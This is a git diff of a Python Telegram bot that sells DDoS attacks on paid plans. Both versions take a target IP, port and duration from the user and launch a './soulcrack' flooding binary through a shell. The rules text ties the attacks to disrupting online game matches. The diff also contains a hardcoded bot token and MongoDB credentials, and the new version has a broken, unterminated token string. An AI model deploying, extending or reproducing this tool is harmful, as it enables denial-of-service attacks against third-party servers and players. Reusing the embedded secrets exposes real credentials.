@@ -1,359 +1,342 @@
-#soulddoserpython
-
-import telebot
-import subprocess
-import datetime
 import os
+import telebot
+import json
+import requests
+import logging
+import time
+from pymongo import MongoClient
+from datetime import datetime, timedelta
+import certifi
+import random
+from subprocess import Popen
+from threading import Thread
+import asyncio
+import aiohttp
+from telebot.types import ReplyKeyboardMarkup, KeyboardButton
 
-# Insert your Telegram bot token here
-bot = telebot.TeleBot('7358755762:AAH8nEpfFdZuKm8eSW96pCd7uJEgroKJIn4')
+loop = asyncio.get_event_loop()
 
-# Admin user IDs
-admin_id = {"6286507682"}
-USER_FILE = "users1.txt"
-LOG_FILE = "log1.txt"
+TOKEN = '7358755762:AAH8nEpfFdZuKm8eSW96pCd7uJEgroKJIn4
+MONGO_URI = 'mongodb+srv://Bishal:Bishal@bishal.dffybpx.mongodb.net/?retryWrites=true&w=majority&appName=Bishal'
+FORWARD_CHANNEL_ID = -1002403452723
+CHANNEL_ID = -1002403452723
+error_channel_id = -1002403452723
 
-def read_users():
+logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
+
+client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
+db = client['zoya']
+users_collection = db.users
+
+bot = telebot.TeleBot(TOKEN)
+REQUEST_INTERVAL = 1
+
+blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]  # Blocked ports list
+
+async def start_asyncio_thread():
+    asyncio.set_event_loop(loop)
+    await start_asyncio_loop()
+
+def update_proxy():
+    proxy_list = [
+        "https://80.78.23.49:1080"
+    ]
+    proxy = random.choice(proxy_list)
+    telebot.apihelper.proxy = {'https': proxy}
+    logging.info("Proxy updated successfully.")
+
+@bot.message_handler(commands=['update_proxy'])
+def update_proxy_command(message):
+    chat_id = message.chat.id
     try:
-        with open(USER_FILE, "r") as file:
-            return file.read().splitlines()
-    except FileNotFoundError:
-        return []
+        update_proxy()
+        bot.send_message(chat_id, "Proxy updated successfully.")
+    except Exception as e:
+        bot.send_message(chat_id, f"Failed to update proxy: {e}")
 
-def read_free_users():
+async def start_asyncio_loop():
+    while True:
+        await asyncio.sleep(REQUEST_INTERVAL)
+
+async def run_attack_command_async(target_ip, target_port, duration):
+    process = await asyncio.create_subprocess_shell(f"./soulcrack {target_ip} {target_port} {duration}")
+    await process.communicate()
+    bot.attack_in_progress = False
+
+def is_user_admin(user_id, chat_id):
     try:
-        with open(FREE_USER_FILE, "r") as file:
-            lines = file.read().splitlines()
-            for line in lines:
-                if line.strip():
-                    user_info = line.split()
-                    if len(user_info) == 2:
-                        user_id, credits = user_info
-                        free_user_credits[user_id] = int(credits)
-                    else:
-                        print(f"Ignoring invalid line in free user file: {line}")
-    except FileNotFoundError:
-        pass
+        return bot.get_chat_member(chat_id, user_id).status in ['administrator', 'creator']
+    except:
+        return False
 
-allowed_user_ids = read_users()
+@bot.message_handler(commands=['approve', 'disapprove'])
+def approve_or_disapprove_user(message):
+    user_id = message.from_user.id
+    chat_id = message.chat.id
+    is_admin = is_user_admin(user_id, CHANNEL_ID)
+    cmd_parts = message.text.split()
 
-def log_command(user_id, king, soulking, time):
-    user_info = bot.get_chat(user_id)
-    if user_info.username:
-        username = "@" + user_info.username
-    else:
-        username = f"UserID: {user_id}"
-    
-    with open(LOG_FILE, "a") as file:  # Open in "append" mode
-        file.write(f"Username: {username}\nking: {king}\nsoulking: {soulking}\nTime: {time}\n\n")
+    if not is_admin:
+        bot.send_message(chat_id, "*🚫 Access Denied!*\n"
+                                   "*You don't have permission to use this command.*", parse_mode='Markdown')
+        return
 
-def clear_logs():
-    try:
-        with open(LOG_FILE, "r+") as file:
-            if file.read() == "":
-                response = "Logs are already cleared. No data found ."
-            else:
-                file.truncate(0)
-                response = "Logs cleared successfully ✅"
-    except FileNotFoundError:
-        response = "No logs found to clear."
-    return response
+    if len(cmd_parts) < 2:
+        bot.send_message(chat_id, "*⚠️ Hold on! Invalid command format.*\n"
+                                   "*Please use one of the following commands:*\n"
+                                   "*1. /approve <user_id> <plan> <days>*\n"
+                                   "*2. /disapprove <user_id>*", parse_mode='Markdown')
+        return
 
-def record_command_logs(user_id, command, king=None, soulking=None, time=None):
-    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
-    if king:
-        log_entry += f" | king: {king}"
-    if soulking:
-        log_entry += f" | soulking: {soulking}"
-    if time:
-        log_entry += f" | Time: {time}"
-    
-    with open(LOG_FILE, "a") as file:
-        file.write(log_entry + "\n")
+    action = cmd_parts[0]
+    target_user_id = int(cmd_parts[1])
+    target_username = message.reply_to_message.from_user.username if message.reply_to_message else None
+    plan = int(cmd_parts[2]) if len(cmd_parts) >= 3 else 0
+    days = int(cmd_parts[3]) if len(cmd_parts) >= 4 else 0
 
-@bot.message_handler(commands=['add'])
-def add_user(message):
-    user_id = str(message.chat.id)
-    if user_id in admin_id:
-        command = message.text.split()
-        if len(command) > 1:
-            user_to_add = command[1]
-            if user_to_add not in allowed_user_ids:
-                allowed_user_ids.append(user_to_add)
-                with open(USER_FILE, "a") as file:
-                    file.write(f"{user_to_add}\n")
-                response = f"User {user_to_add} Added Successfully 👍."
-            else:
-                response = "User already exists 🤦‍♂️."
-        else:
-            response = "Please specify a user ID to add 😒."
-    else:
-        response = "ᵀᵁᴹˢᴱ ᴺᴬ ᴴᴼ ᴾᴬʸᴱᴳᴬ🤣"
-
-    bot.reply_to(message, response)
-
-
-
-@bot.message_handler(commands=['remove'])
-def remove_user(message):
-    user_id = str(message.chat.id)
-    if user_id in admin_id:
-        command = message.text.split()
-        if len(command) > 1:
-            user_to_remove = command[1]
-            if user_to_remove in allowed_user_ids:
-                allowed_user_ids.remove(user_to_remove)
-                with open(USER_FILE, "w") as file:
-                    for user_id in allowed_user_ids:
-                        file.write(f"{user_id}\n")
-                response = f"User {user_to_remove} removed successfully 👍."
-            else:
-                response = f"User {user_to_remove} not found in the list ."
-        else:
-            response = '''Please Specify A User ID to Remove. 
-✅ Usage: /remove <userid>'''
-    else:
-        response = "ᵀᵁᴹˢᴱ ᴺᴬ ᴴᴼ ᴾᴬʸᴱᴳᴬ🤣"
-
-    bot.reply_to(message, response)
-
-
-@bot.message_handler(commands=['clearlogs'])
-def clear_logs_command(message):
-    user_id = str(message.chat.id)
-    if user_id in admin_id:
-        try:
-            with open(LOG_FILE, "r+") as file:
-                log_content = file.read()
-                if log_content.strip() == "":
-                    response = "Logs are already cleared. No data found ."
-                else:
-                    file.truncate(0)
-                    response = "Logs Cleared Successfully ✅"
-        except FileNotFoundError:
-            response = "Logs are already cleared ."
-    else:
-        response = "😎🇲 🇪  🇰 🇷  🇩 🇺 🇳 🇬 🇦  🇹 🇺 🇲  🇧 🇸  🇰 🇭 🇪 🇱 😎"
-    bot.reply_to(message, response)
-
- 
-
-@bot.message_handler(commands=['allusers'])
-def show_all_users(message):
-    user_id = str(message.chat.id)
-    if user_id in admin_id:
-        try:
-            with open(USER_FILE, "r") as file:
-                user_ids = file.read().splitlines()
-                if user_ids:
-                    response = "Authorized Users:\n"
-                    for user_id in user_ids:
-                        try:
-                            user_info = bot.get_chat(int(user_id))
-                            username = user_info.username
-                            response += f"- @{username} (ID: {user_id})\n"
-                        except Exception as e:
-                            response += f"- User ID: {user_id}\n"
-                else:
-                    response = "No data found "
-        except FileNotFoundError:
-            response = "No data found "
-    else:
-        response = "T̊⫶Ů⫶ Å⫶P̊⫶N̊⫶Å⫶ D̊⫶E̊⫶K̊⫶H̊⫶ N̊⫶Å⫶ B̊⫶H̊⫶Å⫶I̊⫶"
-    bot.reply_to(message, response)
-
-
-@bot.message_handler(commands=['logs'])
-def show_recent_logs(message):
-    user_id = str(message.chat.id)
-    if user_id in admin_id:
-        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
-            try:
-                with open(LOG_FILE, "rb") as file:
-                    bot.send_document(message.chat.id, file)
-            except FileNotFoundError:
-                response = "No data found ."
-                bot.reply_to(message, response)
-        else:
-            response = "No data found "
-            bot.reply_to(message, response)
-    else:
-        response = "ᵀᵁᴹˢᴱ ᴺᴬ ᴴᴼ ᴾᴬʸᴱᴳᴬ🤣"
-        bot.reply_to(message, response)
-
-
-@bot.message_handler(commands=['id'])
-def show_user_id(message):
-    user_id = str(message.chat.id)
-    response = f"🤖Your ID: {user_id}"
-    bot.reply_to(message, response)
-
-def start_attack_reply(message, king, soulking, time):
-    user_info = message.from_user
-    username = user_info.username if user_info.username else user_info.first_name
-    
-    response = f"{username}, ✅🔥𝘾𝙊𝙉𝙂𝙍𝘼𝙏𝙐𝙇𝘼𝙏𝙄𝙊𝙉𝙎🔥✅\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {king}\n𝐏𝐨𝐫𝐭: {soulking}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: soul\n\n🌟 DDOS LAGADO OFFICIAL..!💀"
-    bot.reply_to(message, response)
-
-soul_cooldown = {}
-
-COOLDOWN_TIME =0
-
-@bot.message_handler(commands=['soul'])
-def handle_soul(message):
-    user_id = str(message.chat.id)
-    if user_id in allowed_user_ids:
-        if user_id not in admin_id:
-            
-            if user_id in soul_cooldown and (datetime.datetime.now() - soul_cooldown[user_id]).seconds < 3:
-                response = "You Are On Cooldown . Please Wait 5min Before Running The /soul Command Again."
-                bot.reply_to(message, response)
+    if action == '/approve':
+        if plan == 1:  # Instant Plan 🧡
+            if users_collection.count_documents({"plan": 1}) >= 99:
+                bot.send_message(chat_id, "*🚫 Approval Failed: Instant Plan 🧡 limit reached (99 users).*", parse_mode='Markdown')
                 return
-            # Update the last time the user ran the command
-            soul_cooldown[user_id] = datetime.datetime.now()
-        
-        command = message.text.split()
-        if len(command) == 4:  
-            king = command[1]
-            soulking = int(command[2])  
-            time = int(command[3])  
-            if time > 181:
-                response = "Error: Time interval must be less than 80."
-            else:
-                record_command_logs(user_id, '/soul_compiled', king, soulking, time)
-                log_command(user_id, king, soulking, time)
-                start_attack_reply(message, king, soulking, time)  
-                full_command = f"./soulcrack {king} {soulking} {time} 1024 900"
-                subprocess.run(full_command, shell=True)
-                response = f"-漫~*'¨¯¨'*·舞~ 🇮🇳ąɬɬąƈƙ ƈơɱ℘Ɩɛɬɛɖ🇮🇳 ~舞*'¨¯¨'*·~漫- king: {king} soulking: {soulking} soulking: {time}"
+        elif plan == 2:  # Instant++ Plan 💥
+            if users_collection.count_documents({"plan": 2}) >= 499:
+                bot.send_message(chat_id, "*🚫 Approval Failed: Instant++ Plan 💥 limit reached (499 users).*", parse_mode='Markdown')
+                return
+
+        valid_until = (datetime.now() + timedelta(days=days)).date().isoformat() if days > 0 else datetime.now().date().isoformat()
+        users_collection.update_one(
+            {"user_id": target_user_id},
+            {"$set": {"user_id": target_user_id, "username": target_username, "plan": plan, "valid_until": valid_until, "access_count": 0}},
+            upsert=True
+        )
+        msg_text = (f"*🎉 Congratulations!*\n"
+                    f"*User {target_user_id} has been approved!*\n"
+                    f"*Plan: {plan} for {days} days!*\n"
+                    f"*Welcome to our community! Let’s make some magic happen! ✨*")
+    else:  # disapprove
+        users_collection.update_one(
+            {"user_id": target_user_id},
+            {"$set": {"plan": 0, "valid_until": "", "access_count": 0}},
+            upsert=True
+        )
+        msg_text = (f"*❌ Disapproval Notice!*\n"
+                    f"*User {target_user_id} has been disapproved.*\n"
+                    f"*They have been reverted to free access.*\n"
+                    f"*Encourage them to try again soon! 🍀*")
+
+    bot.send_message(chat_id, msg_text, parse_mode='Markdown')
+    bot.send_message(CHANNEL_ID, msg_text, parse_mode='Markdown')
+
+
+
+# Initialize attack flag, duration, and start time
+bot.attack_in_progress = False
+bot.attack_duration = 0  # Store the duration of the ongoing attack
+bot.attack_start_time = 0  # Store the start time of the ongoing attack
+
+@bot.message_handler(commands=['attack'])
+def handle_attack_command(message):
+    user_id = message.from_user.id
+    chat_id = message.chat.id
+
+    try:
+        user_data = users_collection.find_one({"user_id": user_id})
+        if not user_data or user_data['plan'] == 0:
+            bot.send_message(chat_id, "*🚫 Access Denied!*\n"  # Access Denied message
+                                       "*You need to be approved to use this bot.*\n"  # Need approval message
+                                       "*Contact the owner for assistance: @SOULCRACK.*", parse_mode='Markdown')  # Contact owner message
+            return
+
+        # Check plan limits
+        if user_data['plan'] == 1 and users_collection.count_documents({"plan": 1}) > 99:
+            bot.send_message(chat_id, "*🧡 Instant Plan is currently full!* \n"  # Instant Plan full message
+                                       "*Please consider upgrading for priority access.*", parse_mode='Markdown')  # Upgrade message
+            return
+
+        if user_data['plan'] == 2 and users_collection.count_documents({"plan": 2}) > 499:
+            bot.send_message(chat_id, "*💥 Instant++ Plan is currently full!* \n"  # Instant++ Plan full message
+                                       "*Consider upgrading or try again later.*", parse_mode='Markdown')  # Upgrade message
+            return
+
+        if bot.attack_in_progress:
+            bot.send_message(chat_id, "*⚠️ Please wait!*\n"  # Busy message
+                                       "*The bot is busy with another attack.*\n"  # Current attack message
+                                       "*Check remaining time with the /when command.*", parse_mode='Markdown')  # Check remaining time
+            return
+
+        bot.send_message(chat_id, "*💣 Ready to launch an attack?*\n"  # Ready to launch message
+                                   "*Please provide the target IP, port, and duration in seconds.*\n"  # Provide details message
+                                   "*Example: 167.67.25 6296 60* 🔥\n"  # Example message
+                                   "*Let the chaos begin! 🎉*", parse_mode='Markdown')  # Start chaos message
+        bot.register_next_step_handler(message, process_attack_command)
+
+    except Exception as e:
+        logging.error(f"Error in attack command: {e}")
+
+def process_attack_command(message):
+    try:
+        args = message.text.split()
+        if len(args) != 3:
+            bot.send_message(message.chat.id, "*❗ Error!*\n"  # Error message
+                                               "*Please use the correct format and try again.*\n"  # Correct format message
+                                               "*Make sure to provide all three inputs! 🔄*", parse_mode='Markdown')  # Three inputs message
+            return
+
+        target_ip, target_port, duration = args[0], int(args[1]), int(args[2])
+
+        if target_port in blocked_ports:
+            bot.send_message(message.chat.id, f"*🔒 Port {target_port} is blocked.*\n"  # Blocked port message
+                                               "*Please select a different port to proceed.*", parse_mode='Markdown')  # Different port message
+            return
+        if duration >= 600:
+            bot.send_message(message.chat.id, "*⏳ Maximum duration is 599 seconds.*\n"  # Duration limit message
+                                               "*Please shorten the duration and try again!*", parse_mode='Markdown')  # Shorten duration message
+            return  
+
+        bot.attack_in_progress = True  # Mark that an attack is in progress
+        bot.attack_duration = duration  # Store the duration of the ongoing attack
+        bot.attack_start_time = time.time()  # Record the start time
+
+        # Start the attack
+        asyncio.run_coroutine_threadsafe(run_attack_command_async(target_ip, target_port, duration), loop)
+        bot.send_message(message.chat.id, f"*🚀 Attack Launched! 🚀*\n\n"  # Attack launched message
+                                           f"*📡 Target Host: {target_ip}*\n"  # Target host message
+                                           f"*👉 Target Port: {target_port}*\n"  # Target port message
+                                           f"*⏰ Duration: {duration} seconds! Let the chaos unfold! 🔥*", parse_mode='Markdown')  # Duration message
+
+    except Exception as e:
+        logging.error(f"Error in processing attack command: {e}")
+
+
+
+
+
+def start_asyncio_thread():
+    asyncio.set_event_loop(loop)
+    loop.run_until_complete(start_asyncio_loop())
+
+@bot.message_handler(commands=['when'])
+def when_command(message):
+    chat_id = message.chat.id
+    if bot.attack_in_progress:
+        elapsed_time = time.time() - bot.attack_start_time  # Calculate elapsed time
+        remaining_time = bot.attack_duration - elapsed_time  # Calculate remaining time
+
+        if remaining_time > 0:
+            bot.send_message(chat_id, f"*⏳ Time Remaining: {int(remaining_time)} seconds...*\n"
+                                       "*🔍 Hold tight, the action is still unfolding!*\n"
+                                       "*💪 Stay tuned for updates!*", parse_mode='Markdown')
         else:
-            response = "✅A͢v͢a͢i͢l͢a͢b͢l͢e͢ r͢i͢g͢h͢t͢ n͢o͢w͢✅ :- /soul <king> <soulking> <time>"  
+            bot.send_message(chat_id, "*🎉 The attack has successfully completed!*\n"
+                                       "*🚀 You can now launch your own attack and showcase your skills!*", parse_mode='Markdown')
     else:
-        response = " ミ🥹★ 𝘈𝘤𝘤𝘦𝘴𝘴 𝘭𝘦 𝘭𝘦 𝘣𝘳𝘰 ★🥹彡DM - @SOULCRACK ."
-
-    bot.reply_to(message, response)
-
+        bot.send_message(chat_id, "*❌ No attack is currently in progress!*\n"
+                                   "*🔄 Feel free to initiate your attack whenever you're ready!*", parse_mode='Markdown')
 
 
-@bot.message_handler(commands=['mylogs'])
-def show_command_logs(message):
-    user_id = str(message.chat.id)
-    if user_id in allowed_user_ids:
-        try:
-            with open(LOG_FILE, "r") as file:
-                command_logs = file.readlines()
-                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
-                if user_logs:
-                    response = "Your Command Logs:\n" + "".join(user_logs)
-                else:
-                    response = " No Command Logs Found For You ."
-        except FileNotFoundError:
-            response = "No command logs found."
+@bot.message_handler(commands=['myinfo'])
+def myinfo_command(message):
+    user_id = message.from_user.id
+    user_data = users_collection.find_one({"user_id": user_id})
+
+    if not user_data:
+        # User not found in the database
+        response = "*❌ Oops! No account information found!* \n"  # Account not found message
+        response += "*For assistance, please contact the owner: @SOULCRACK* "  # Contact owner message
+    elif user_data.get('plan', 0) == 0:
+        # User found but not approved
+        response = "*🔒 Your account is still pending approval!* \n"  # Not approved message
+        response += "*Please reach out to the owner for assistance: @SOULCRACK* 🙏"  # Contact owner message
     else:
-        response = "ᵀᵁᴹˢᴱ ᴺᴬ ᴴᴼ ᴾᴬʸᴱᴳᴬ🤣"
+        # User found and approved
+        username = message.from_user.username or "Unknown User"  # Default username if none provided
+        plan = user_data.get('plan', 'N/A')  # Get user plan
+        valid_until = user_data.get('valid_until', 'N/A')  # Get validity date
+        current_time = datetime.now().isoformat()  # Get current time
+        response = (f"*👤 USERNAME: @{username}* \n"  # Username
+                    f"*💸 PLAN: {plan}* \n"  # User plan
+                    f"*⏳ VALID UNTIL: {valid_until}* \n"  # Validity date
+                    f"*⏰ CURRENT TIME: {current_time}* \n"  # Current time
+                    f"*🌟 Thank you for being an important part of our community! If you have any questions or need help, just ask! We’re here for you!* 💬🤝")  # Community message
 
-    bot.reply_to(message, response)
+    bot.send_message(message.chat.id, response, parse_mode='Markdown')
+
+@bot.message_handler(commands=['rules'])
+def rules_command(message):
+    rules_text = (
+        "*📜 Bot Rules - Keep It Cool!\n\n"
+        "1. No spamming attacks! ⛔ \nRest for 5-6 matches between DDOS.\n\n"
+        "2. Limit your kills! 🔫 \nStay under 30-40 kills to keep it fair.\n\n"
+        "3. Play smart! 🎮 \nAvoid reports and stay low-key.\n\n"
+        "4. No mods allowed! 🚫 \nUsing hacked files will get you banned.\n\n"
+        "5. Be respectful! 🤝 \nKeep communication friendly and fun.\n\n"
+        "6. Report issues! 🛡️ \nMessage TO Owner for any problems.\n\n"
+        "💡 Follow the rules and let’s enjoy gaming together!*"
+    )
+
+    try:
+        bot.send_message(message.chat.id, rules_text, parse_mode='Markdown')
+    except Exception as e:
+        print(f"Error while processing /rules command: {e}")
+
+    except Exception as e:
+        print(f"Error while processing /rules command: {e}")
 
 
 @bot.message_handler(commands=['help'])
-def show_help(message):
-    help_text ='''🤖 Available commands:
-💥 /soul : Method For soul Servers. 
-💥 /rules : Please Check Before Use !!.
-💥 /mylogs : To Check Your Recents Attacks.
-💥 /plan : Checkout Our Botnet Rates.
+def help_command(message):
+    help_text = ("*🌟 Welcome to the Ultimate Command Center!*\n\n"
+                 "*Here’s what you can do:* \n"
+                 "1. *`/attack` - ⚔️ Launch a powerful attack and show your skills!*\n"
+                 "2. *`/myinfo` - 👤 Check your account info and stay updated.*\n"
+                 "3. *`/owner` - 📞 Get in touch with the mastermind behind this bot!*\n"
+                 "4. *`/when` - ⏳ Curious about the bot's status? Find out now!*\n"
+                 "5. *`/canary` - 🦅 Grab the latest Canary version for cutting-edge features.*\n"
+                 "6. *`/rules` - 📜 Review the rules to keep the game fair and fun.*\n\n"
+                 "*💡 Got questions? Don't hesitate to ask! Your satisfaction is our priority!*")
 
-🤖 To See Admin Commands:
-💥 /admincmd : Shows All Admin Commands.
+    try:
+        bot.send_message(message.chat.id, help_text, parse_mode='Markdown')
+    except Exception as e:
+        print(f"Error while processing /help command: {e}")
 
-'''
-    for handler in bot.message_handlers:
-        if hasattr(handler, 'commands'):
-            if message.text.startswith('/help'):
-                help_text += f"{handler.commands[0]}: {handler.doc}\n"
-            elif handler.doc and 'admin' in handler.doc.lower():
-                continue
-            else:
-                help_text += f"{handler.commands[0]}: {handler.doc}\n"
-    bot.reply_to(message, help_text)
+
+
+@bot.message_handler(commands=['owner'])
+def owner_command(message):
+    response = (
+        "*👤 **Owner Information:**\n\n"
+        "For any inquiries, support, or collaboration opportunities, don't hesitate to reach out to the owner:\n\n"
+        "📩 **Telegram:** @SOULCRACK\n\n"
+        "💬 **We value your feedback!** Your thoughts and suggestions are crucial for improving our service and enhancing your experience.\n\n"
+        "🌟 **Thank you for being a part of our community!** Your support means the world to us, and we’re always here to help!*\n"
+    )
+    bot.send_message(message.chat.id, response, parse_mode='Markdown')
 
 @bot.message_handler(commands=['start'])
-def welcome_start(message):
-    user_name = message.from_user.first_name
-    response = f'''ıllıllı⭐🌟 W͙e͙l͙c͙o͙m͙e͙ t͙o͙ soul family ❣️ 🌟⭐ıllıllı \n {user_name}! \n🄱🄶🄼🄸 🄺🄸 🄶🄰🄽🄳 🄼🄰🅁🄽🄴 🄰🄰 🄶🅈🄴😜
-🤖Try To Run This Command : /help 
-'''
-    bot.reply_to(message, response)
-
-@bot.message_handler(commands=['rules'])
-def welcome_rules(message):
-    user_name = message.from_user.first_name
-    response = f'''{user_name} Please Follow These Rules ⚠️:
-
-1. Dont Run Too Many Attacks !! Cause A Ban From Bot
-2. Dont Run 2 Attacks At Same Time Becz If U Then U Got Banned From Bot. 
-3. We Daily Checks The Logs So Follow these rules to avoid Ban!!'''
-    bot.reply_to(message, response)
-
-@bot.message_handler(commands=['plan'])
-def welcome_plan(message):
-    user_name = message.from_user.first_name
-    response = f'''{user_name}, 🎯彡[ʙʀᴏᴛʜᴇʀ ᴏɴʟʏ 1 ᴘʟᴀɴ ɪꜱ ᴘᴏᴡᴇʀꜰᴜʟʟ ᴛʜᴇɴ ᴀɴʏ ᴏᴛʜᴇʀ ᴅᴅᴏꜱ]彡🎯 !!:
-
-Vip 🌟 :
--> Attack Time : 180 (S)
-> After Attack Limit : 5 Min
--> Concurrents Attack : 3
-
-Pr-ice List💸 :
-Day-->100 Rs
-Week-->600 Rs
-Month-->1600 Rs
-'''
-    bot.reply_to(message, response)
-
-@bot.message_handler(commands=['admincmd'])
-def welcome_plan(message):
-    user_name = message.from_user.first_name
-    response = f'''{user_name}, Admin Commands Are Here!!:
-
-💥 /add <userId> : Add a User.
-💥 /remove <userid> Remove a User.
-💥 /allusers : Authorised Users Lists.
-💥 /logs : All Users Logs.
-💥 /broadcast : Broadcast a Message.
-💥 /clearlogs : Clear The Logs File.
-'''
-    bot.reply_to(message, response)
-
-
-@bot.message_handler(commands=['broadcast'])
-def broadcast_message(message):
-    user_id = str(message.chat.id)
-    if user_id in admin_id:
-        command = message.text.split(maxsplit=1)
-        if len(command) > 1:
-            message_to_broadcast = "⚠️ Message To All Users By Admin:\n\n" + command[1]
-            with open(USER_FILE, "r") as file:
-                user_ids = file.read().splitlines()
-                for user_id in user_ids:
-                    try:
-                        bot.send_message(user_id, message_to_broadcast)
-                    except Exception as e:
-                        print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
-            response = "Broadcast Message Sent Successfully To All Users 👍."
-        else:
-            response = "🤖 Please Provide A Message To Broadcast."
-    else:
-        response = "ᵀᵁᴹˢᴱ ᴺᴬ ᴴᴼ ᴾᴬʸᴱᴳᴬ🤣"
-
-    bot.reply_to(message, response)
-
-
-
-
-while True:
+def start_message(message):
     try:
-        bot.polling(none_stop=True)
+        bot.send_message(message.chat.id, "*🌍 WELCOME TO DDOS WORLD!* 🎉\n\n"
+                                           "*🚀 Get ready to dive into the action!*\n\n"
+                                           "*💣 To unleash your power, use the* `/attack` *command followed by your target's IP and port.* ⚔️\n\n"
+                                           "*🔍 Example: After* `/attack`, *enter:* `ip port duration`.\n\n"
+                                           "*🔥 Ensure your target is locked in before you strike!*\n\n"
+                                           "*📚 New around here? Check out the* `/help` *command to discover all my capabilities.* 📜\n\n"
+                                           "*⚠️ Remember, with great power comes great responsibility! Use it wisely... or let the chaos reign!* 😈💥", 
+                                           parse_mode='Markdown')
     except Exception as e:
-        print(e)
+        print(f"Error while processing /start command: {e}")
+
+
+if __name__ == "__main__":
+    asyncio_thread = Thread(target=start_asyncio_thread, daemon=True)
+    asyncio_thread.start()
+    logging.info("Starting Codespace activity keeper and Telegram bot...")
+    while True:
+        try:
+            bot.polling(none_stop=True)
+        except Exception as e:
+            logging.error(f"An error occurred while polling: {e}")
+        logging.info(f"Waiting for {REQUEST_INTERVAL} seconds before the next request...")
+        time.sleep(REQUEST_INTERVAL)
